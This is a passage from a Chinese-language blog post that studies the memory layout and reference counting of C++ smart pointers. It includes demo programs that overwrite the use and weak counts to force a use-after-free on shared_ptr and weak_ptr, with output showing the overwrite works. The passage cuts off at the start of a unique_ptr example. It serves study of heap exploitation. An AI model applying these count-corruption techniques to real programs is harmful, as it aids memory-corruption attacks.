class="language-plaintext highlighter-rouge">_M_release()</code>中<br/></h5> <h5 id="movabs这一句-0x100000001直接硬编码在指令里-看来是有bear而来">   <code class="language-plaintext highlighter-rouge">movabs</code>这一句, 0x100000001直接硬编码在指令里, 看来是有bear而来<br/></h5> <h5 id="cmp-rax里是堆块中use-count--weak-count的那一个字长的拷贝-这里就是比较此时是不是两个count都只剩1了-也就是该堆块只有当前正在析构的指针还在引用-如果是的话-zf标志位为1">   <code class="language-plaintext highlighter-rouge">cmp</code>, <code class="language-plaintext highlighter-rouge">rax</code>里是堆块中<code class="language-plaintext highlighter-rouge">use count + weak count</code>的那一个字长的拷贝. 这里就是比较此时是不是两个<code class="language-plaintext highlighter-rouge">count</code>都只剩1了, 也就是该堆块只有当前正在析构的指针还在引用, 如果是的话, ZF标志位为1<br/></h5> <h5 id="sete-al-当equalzf为1时-al被设置为1-反之为0">   <code class="language-plaintext highlighter-rouge">sete al</code>, 当equal(ZF为1)时, al被设置为1, 反之为0<br/></h5> <h5 id="test-al-al-经典按位与用来判断是不是0-结果不是0-zf变成0">   <code class="language-plaintext highlighter-rouge">test al, al</code>, 经典按位与用来判断是不是0, 结果不是0, ZF变成0</h5> <h5 id="je--此时不跳转-进入下面的堆块释放环节">   <code class="language-plaintext highlighter-rouge">je ...</code>, 此时不跳转, 进入下面的堆块释放环节.</h5> <h5 id="释放的环节调用了两个方法-_m_dispose-和_m_destroy-但是在这之前-use-count和weak-count被清零了-如下图">   释放的环节调用了两个方法, <code class="language-plaintext highlighter-rouge">_M_dispose</code>, 和<code class="language-plaintext highlighter-rouge">_M_destroy</code>, 但是在这之前, <code class="language-plaintext highlighter-rouge">use count</code>和<code class="language-plaintext highlighter-rouge">weak count</code>被清零了, 如下图</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b4c72b804.png" alt="Screenshot 2025-01-24 214047.png"/></p> <h5 id="然后分别call了_m_dispose-和_m_destroy">   然后分别<code class="language-plaintext highlighter-rouge">call</code>了<code class="language-plaintext highlighter-rouge">_M_dispose</code>, 和<code class="language-plaintext highlighter-rouge">_M_destroy</code></h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b574dd8dd.png" alt="Screenshot 2025-01-24 221428.png"/> <img src="https://www.helloimg.com/i/2025/01/24/6793b5a67c6ff.png" alt="Screenshot 2025-01-24 215026.png"/></p> <h5 id="在_m_destory中-在__allocator_ptr-之后堆块释放-更细节的调用没再追踪了">   在<code class="language-plaintext highlighter-rouge">_M_destory</code>中, 在<code class="language-plaintext highlighter-rouge">~__allocator_ptr</code>, 之后堆块释放. 更细节的调用没再追踪了</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b6565a060.png" alt="Screenshot 2025-01-24 221129.png"/></p> <h5 id="如果两个count不是1-会进入下面的分支">   如果两个<code class="language-plaintext highlighter-rouge">count</code>不是1, 会进入下面的分支</h5> <p><img src="https://www.helloimg.com/i/2025/01/24/6793b6d9c1d7e.png" alt="Screenshot 2025-01-24 220024.png"/></p> <h3 id="shared_ptr的uaf"> shared_ptr的UAF</h3> <h5 id="根据上面的分析-得知两点">   根据上面的分析, 得知两点<br/></h5> <h5 id="第一-必须要让use-count和weak-count都是1-才能触发堆块释放的操作">   第一, 必须要让<code class="language-plaintext highlighter-rouge">use count</code>和<code class="language-plaintext highlighter-rouge">weak count</code>都是1, 才能触发堆块释放的操作<br/></h5> <h5 id="第二-想要让一个堆块释放-应该先进入一个shared_ptr的析构函数-毕竟没人会在用了智能指针之后还手动delete">   第二, 想要让一个堆块释放, 应该先进入一个<code class="language-plaintext highlighter-rouge">shared_ptr</code>的析构函数, 毕竟没人会在用了智能指针之后还手动delete.<br/></h5> <h5 id="如此-一个简单的uaf思路产生了-利用程序漏洞篡改两个count都是1-然后触发析构-如果此时还有别的shared_ptr没析构-那么就成功uaf了-不过需要注意的是-因为chunk内成员的排布中-虚表和两个count在指针获得的空间的低位-如果想要改这两个成员-可能需要借助别的漏洞">   如此, 一个简单的UAF思路产生了, 利用程序漏洞篡改两个<code class="language-plaintext highlighter-rouge">count</code>都是1, 然后触发析构, 如果此时还有别的<code class="language-plaintext highlighter-rouge">shared_ptr</code>没析构, 那么就成功UAF了, 不过需要注意的是, 因为<code class="language-plaintext highlighter-rouge">chunk</code>内成员的排布中, 虚表和两个<code class="language-plaintext highlighter-rouge">count</code>在指针获得的空间的低位. 如果想要改这两个成员, 可能需要借助别的漏洞.</h5> <h5 id="看另一个demo">   看另一个demo</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
    
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
        <span class="c1">// change use count: 2 -&gt; 1</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">use_count</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="n">ptr1</span><span class="p">.</span><span class="n">get</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
        <span class="o">*</span><span class="n">use_count</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
        <span class="c1">// 生命周期结束, ptr1析构, 同时触发ptr和ptr1指向的堆块free</span>
    <span class="p">}</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr_new</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>

    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span> <span class="c1">// UAF</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span> <span class="o">*</span><span class="n">ptr_new</span> <span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
     
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div> <h5 id="uaf大成功-没用的知识又增加了">   UAF大成功, 没用的知识又增加了</h5> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ g++ test.cpp -g -o test
$ ./test 
1919810
</code></pre></div></div> <h2 id="weak_ptr">weak_ptr</h2> <h3 id="内存回收方式-1"> 内存回收方式</h3> <h5 id="首先了解一下weak_ptr的使用场景-就是为了避免shared_ptr之间的循环引用">   首先了解一下<code class="language-plaintext highlighter-rouge">weak_ptr</code>的使用场景, 就是为了避免<code class="language-plaintext highlighter-rouge">shared_ptr</code>`之间的循环引用.</h5> <h5 id="先看一个没有循环引用的demo-结构体wrapper有一个成员ptr">   先看一个没有循环引用的demo, 结构体wrapper有一个成员ptr.</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">wrapper</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="p">{</span>
        <span class="c1">///@note wrapprx 应该叫做 wrapperx_ptr 才符合语义, 但是图都截了...</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper3</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">wrapper1</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper2</span><span class="p">;</span>
        <span class="n">wrapper2</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper3</span><span class="p">;</span>
        <span class="n">wrapper3</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="nb">nullptr</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/01/25/679500556e25c.png" alt="Screenshot 2025-01-25 232012.png"/></p> <h5 id="如图-在wrapper3析构之后-对应的内存没有free-事实上-在wrapper1之后-三个chunk才会一起释放-但这个过程中-三个wrapper指向的内存的引用计数在正确地减少">   如图, 在wrapper3析构之后, 对应的内存没有free. 事实上, 在wrapper1之后, 三个chunk才会一起释放. 但这个过程中, 三个wrapper指向的内存的引用计数在正确地减少.</h5> <h5 id="ps-作用域结束时-析构的顺序是构造的顺序是相反的-v12是赋值是产生的copy-可以不管">   ps: 作用域结束时, 析构的顺序是构造的顺序是相反的, v12是赋值是产生的copy, 可以不管</h5> <p><img src="https://www.helloimg.com/i/2025/01/25/67950718340db.png" alt="Screenshot 2025-01-25 234952.png"/></p> <h5 id="stdshared_ptrwrappershared_ptrwrapper1析构wrapper1时-析构了wrapper1-ptr-wrapper1-ptr指针析构时又其指向的对象wrapper2-wrapper2析构时-需要析构wrapper2-ptr-析构wrapper2-ptr是析构了指向的对象wrapper3">   <code class="language-plaintext highlighter-rouge">std::shared_ptr&lt;wrapper&gt;::~shared_ptr(wrapper1);</code>析构<code class="language-plaintext highlighter-rouge">wrapper1</code>时, 析构了<code class="language-plaintext highlighter-rouge">wrapper1-&gt;ptr</code>, <code class="language-plaintext highlighter-rouge">wrapper1-&gt;ptr</code>指针析构时又其指向的对象(wrapper2), <code class="language-plaintext highlighter-rouge">wrapper2</code>析构时, 需要析构<code class="language-plaintext highlighter-rouge">wrapper2-&gt;ptr</code>, 析构<code class="language-plaintext highlighter-rouge">wrapper2-&gt;ptr</code>是析构了指向的对象<code class="language-plaintext highlighter-rouge">*wrapper3</code><br/></h5> <h5 id="wrapper3的chunk释放之后-调用栈回溯-逐个又free其他chunk">   <code class="language-plaintext highlighter-rouge">*wrapper3</code>的chunk释放之后, 调用栈回溯, 逐个又free其他chunk<br/></h5> <h5 id="如果说话的方式简单点-就是析构智能指针就会析构所指向的对象-析构所指向的对象就会该对象使用的智能指针">   如果说话的方式简单点, 就是析构智能指针就会析构所指向的对象, 析构所指向的对象就会该对象使用的智能指针.<br/></h5> <h5 id="在这个过程中-三块内存保存的use_count">   在这个过程中, 三块内存保存的use_count</h5> <table> <thead> <tr> <th style="text-align: center">析构状态</th> <th style="text-align: center">chunk1</th> <th style="text-align: center">chunk2</th> <th style="text-align: center">chunk3</th> </tr> </thead> <tbody> <tr> <td style="text-align: center">没析构</td> <td style="text-align: center">1</td> <td style="text-align: center">2</td> <td style="text-align: center">2</td> </tr> <tr> <td style="text-align: center">wrapper3析构</td> <td style="text-align: center">1</td> <td style="text-align: center">2</td> <td style="text-align: center">1</td> </tr> <tr> <td style="text-align: center">wrapper2析构</td> <td style="text-align: center">1</td> <td style="text-align: center">1</td> <td style="text-align: center">1</td> </tr> <tr> <td style="text-align: center">wrapper1析构</td> <td style="text-align: center">free</td> <td style="text-align: center">free</td> <td style="text-align: center">free</td> </tr> </tbody> </table> <h5 id="进入正题-有循环引用的demo">   进入正题, 有循环引用的demo</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">wrapper</span>
<span class="p">{</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">ptr</span><span class="p">;</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper1</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span> <span class="n">wrapper2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="n">wrapper</span><span class="o">&gt;</span><span class="p">();</span>
        <span class="n">wrapper2</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper1</span><span class="p">;</span>
        <span class="n">wrapper1</span><span class="o">-&gt;</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">wrapper2</span><span class="p">;</span> <span class="c1">// 构成循环引用</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/01/25/6794f93b7560c.png" alt="Screenshot 2025-01-25 224711.png"/></p> <h5 id="如图-当作用域结束之后-两块wrapper的内存都没有释放">   如图, 当作用域结束之后, 两块wrapper的内存都没有释放<br/></h5> <h5 id="简单概括一下-智能指针wrapper1析构时-会析构wrapper对象存在第一个chunk里-然后析构ptr成员-析构wrapper存在第二个chunk里-然后又ptr成员-最后回去析构存在第一个chunk里的wrapper-成功转了个圈">   简单概括一下, 智能指针<code class="language-plaintext highlighter-rouge">wrapper1</code>析构时, 会析构<code class="language-plaintext highlighter-rouge">wrapper</code>对象(存在第一个chunk里), 然后析构<code class="language-plaintext highlighter-rouge">ptr</code>成员, 析构<code class="language-plaintext highlighter-rouge">wrapper</code>(存在第二个chunk里), 然后又<code class="language-plaintext highlighter-rouge">ptr</code>成员, 最后回去析构存在第一个chunk里的<code class="language-plaintext highlighter-rouge">wrapper</code>, 成功转了个圈<br/></h5> <h5 id="析构函数应该有什么检查机制可能是检查地址-因为这个循环递归地析构函数调用并不会卡死程序-但是确实会让引用计数无法正确减少-一直都是2-对应的两个chunk永远无法free-变成僵尸内存">   析构函数应该有什么检查机制(可能是检查地址), 因为这个循环递归地析构函数调用并不会卡死程序, 但是确实会让引用计数无法正确减少, 一直都是2, 对应的两个chunk永远无法free, 变成僵尸内存.<br/></h5> <h5 id="打破循环引用的方法之一是将任意一边的指针换成weak_ptr-这样堆块里use_count不增加-取而代之的是weak_count的增加">   打破循环引用的方法之一是将任意一边的指针换成<code class="language-plaintext highlighter-rouge">weak_ptr</code>, 这样堆块里use_count不增加, 取而代之的是weak_count的增加</h5> <h5 id="weak_ptr有几个比较常用的方法">   <code class="language-plaintext highlighter-rouge">weak_ptr</code>有几个比较常用的方法:<br/></h5> <h5 id="1-expired-返回bool值-表示对应的内存是否销毁销毁不等于内存释放">   1. <code class="language-plaintext highlighter-rouge">.expired()</code>, 返回bool值, 表示对应的内存是否销毁(销毁不等于内存释放)<br/></h5> <h5 id="2-lock-返回一个和weak_ptr指向同样内存的shared_ptr-如果已被销毁-将返回一个nullptr">   2. <code class="language-plaintext highlighter-rouge">.lock()</code>, 返回一个和<code class="language-plaintext highlighter-rouge">weak_ptr</code>指向同样内存的<code class="language-plaintext highlighter-rouge">shared_ptr</code>, 如果已被销毁, 将返回一个nullptr<br/></h5> <h5 id="3-use_count-返回内存的引用计数">   3. <code class="language-plaintext highlighter-rouge">.use_count()</code>, 返回内存的引用计数<br/></h5> <h5 id="上述三个特性是相关联的-引用计数为0时-显示已经销毁expired-lock返回nullptr">   上述三个特性是相关联的, 引用计数为0时, 显示已经销毁(expired), <code class="language-plaintext highlighter-rouge">.lock()</code>返回nullptr.<br/></h5> <h5 id="然后关于weak_ptr造成对应内存释放的问题-举个例子">   然后关于<code class="language-plaintext highlighter-rouge">weak_ptr</code>造成对应内存释放的问题, 举个例子</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="作用域结束时-weak_count和use_count为0x0000000100000000-weak_ptr析构时-顺带释放了对应的chunk">   作用域结束时, <code class="language-plaintext highlighter-rouge">weak_count</code>和<code class="language-plaintext highlighter-rouge">use_count</code>为<code class="language-plaintext highlighter-rouge">0x0000000100000000</code>, <code class="language-plaintext highlighter-rouge">weak_ptr</code>析构时, 顺带释放了对应的<code class="language-plaintext highlighter-rouge">chunk</code><br/></h5> <h3 id="利用方式"> 利用方式</h3> <h5 id="方法基本同shared_ptr-但是需要注意weak_ptr必须依赖于一个shared_ptr否则weak_count为0-表示销毁-lock返回nullptr-无法取用该内存-除此之外和上述share_ptr应该一致">   方法基本同<code class="language-plaintext highlighter-rouge">shared_ptr</code>, 但是需要注意<code class="language-plaintext highlighter-rouge">weak_ptr</code>必须依赖于一个<code class="language-plaintext highlighter-rouge">shared_ptr</code>(否则weak_count为0, 表示销毁, <code class="language-plaintext highlighter-rouge">.lock()</code>返回nullptr, 无法取用该内存), 除此之外和上述<code class="language-plaintext highlighter-rouge">share_ptr</code>应该一致</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x123456789</span><span class="p">);</span>
    <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>

    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr1</span> <span class="o">=</span> <span class="n">weak_ptr</span><span class="p">.</span><span class="n">lock</span><span class="p">();</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="n">ptr</span><span class="p">.</span><span class="n">get</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
        <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="mh">0x100000001</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>
    
    <span class="o">*</span><span class="p">(</span><span class="n">weak_ptr</span><span class="p">.</span><span class="n">lock</span><span class="p">())</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;*</span><span class="n">ptr2</span><span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ g++ test.cpp -g -o test
$ ./test
1919810
</code></pre></div></div> <h5 id="或者反过来-利用weak_ptr的析构导致chunk被提前释放">   或者反过来, 利用<code class="language-plaintext highlighter-rouge">weak_ptr</code>的析构导致<code class="language-plaintext highlighter-rouge">chunk</code>被提前释放<br/></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;memory&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>

    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>

    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">weak_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">weak_ptr</span> <span class="o">=</span> <span class="n">ptr</span><span class="p">;</span>
        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span>
                <span class="p">((</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)(</span><span class="n">weak_ptr</span><span class="p">.</span><span class="n">lock</span><span class="p">().</span><span class="n">get</span><span class="p">())</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
        <span class="o">*</span><span class="n">counts</span> <span class="o">=</span> <span class="mh">0x100000000</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr2</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_shared</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mi">114514</span><span class="p">);</span>

    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="mi">1919810</span><span class="p">;</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span><span class="o">&lt;&lt;</span> <span class="o">*</span><span class="n">ptr2</span> <span class="o">&lt;&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div> <h5 id="效果上是一致的">   效果上是一致的</h5> <h2 id="unique_ptr">unique_ptr</h2> <h3 id="内存回收方式-2"> 内存回收方式</h3> <h5 id="unique_ptr是独占内存的智能指针-一下是几个常用的用法">   <code class="language-plaintext highlighter-rouge">unique_ptr</code>是独占内存的智能指针, 一下是几个常用的用法<br/></h5> <h5 id="1-构造时用stdmake_uniquet或者stdunique_ptrt-ptrnew-t">   1. 构造时用<code class="language-plaintext highlighter-rouge">std::make_unique&lt;T&gt;(...)</code>或者<code class="language-plaintext highlighter-rouge">std::unique_ptr&lt;T&gt; ptr(new T(...))</code><br/></h5> <h5 id="2-unique_ptr之间赋值时需要使用转移语义stdmove-否则编译不通过">   2. <code class="language-plaintext highlighter-rouge">unique_ptr</code>之间赋值时需要使用转移语义<code class="language-plaintext highlighter-rouge">std::move(...)</code>, 否则编译不通过<br/></h5> <h5 id="3-t-raw_ptr--ptrrelease-release方法解除unique_ptr对一个chunk的绑定变成nullptr-并且会返回对应的裸指针">   3. <code class="language-plaintext highlighter-rouge">T* raw_ptr = ptr.release()</code>, <code class="language-plaintext highlighter-rouge">.release()</code>方法解除<code class="language-plaintext highlighter-rouge">unique_ptr</code>对一个<code class="language-plaintext highlighter-rouge">chunk</code>的绑定(变成nullptr), 并且会返回对应的裸指针.<br/></h5> <h5 id="4-ptrreset-如果ptr不是nullptr-那么会解除绑定并且释放内存-如果ptr是nullptr-则无事发生">   4. <code class="language-plaintext highlighter-rouge">ptr.reset()</code>, 如果<code class="language-plaintext highlighter-rouge">ptr</code>不是nullptr, 那么会解除绑定并且释放内存; 如果ptr是nullptr, 则无事发生<br/></h5> <h5 id="5-ptrreset-接受一个对应类型的裸指针-在4的基础上-将unique_ptr绑定到新的内存上">   5. <code class="language-plaintext highlighter-rouge">ptr.reset(...)</code>, 接受一个对应类型的裸指针, 在<code class="language-plaintext highlighter-rouge">4</code>的基础上, 将<code class="language-plaintext highlighter-rouge">unique_ptr</code>绑定到新的内存上</h5> <h5 id="然后是内存布局">   然后是内存布局</h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">std</span><span class="o">::</span><span class="n">unique_ptr</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span> <span class="n">ptr</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_unique</span><span class="o">&lt;</span><span class="kt">size_t</span><span class="o">&gt;</span><span class="p">(</span><span class="mh">0x12345678</span><span class="p">);</span>
</code></pre></div></div> <p><img src="https://www.helloimg.com/i/2025/02/06/67a4a7c1dba9b.png" alt="Screenshot 2025-02-06 201603.png"/></p> <h5 id="上图是chunk内的结构-和裸指针一致-也就是说篡改内存导致uaf不可能了-unique_ptr的创建和析构完全是编译器在编译期自动确定的">   上图是<code class="language-plaintext highlighter-rouge">chunk</code>内的结构, 和裸指针一致, 也就是说篡改内存导致UAF不可能了, <code class="language-plaintext highlighter-rouge">unique_ptr</code>的创建和析构完全是编译器在编译期自动确定的.<br/></h5> <h5 id="但是unique_ptr和shared_ptr或者weak_ptr不同在于-后两者对于chunk的释放包含在对智能指针的析构中-要没一起没-而unique_ptr绑定的内存可以在unique_ptr析构前释放-即调用reset">   但是<code class="language-plaintext highlighter-rouge">unique_ptr</code>和<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>不同在于, 后两者对于<code class="language-plaintext highlighter-rouge">chunk</code>的释放包含在对智能指针的析构中, 要没一起没; 而<code class="language-plaintext highlighter-rouge">unique_ptr</code>绑定的内存可以在<code class="language-plaintext highlighter-rouge">unique_ptr</code>析构前释放, 即调用<code class="language-plaintext highlighter-rouge">.reset()</code><br/></h5> <h5 id="更重要的是-没人会手动调用shared_ptr或者weak_ptr的析构函数-但是unique_ptr的reset却有可能被使用">   更重要的是, 没人会手动调用<code class="language-plaintext highlighter-rouge">shared_ptr</code>或者<code class="language-plaintext highlighter-rouge">weak_ptr</code>的析构函数, 但是<code class="language-plaintext highlighter-rouge">unique_ptr</code>的<code class="language-plaintext highlighter-rouge">.reset()</code>却有可能被使用.<br/></h5> <h5 id="所以-充分考虑开发场景的需要以及开发者可能的失误-可能会有以下的demo出现">   所以, 充分考虑开发场景的需要以及开发者可能的失误, 可能会有以下的demo出现<br/></h5> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
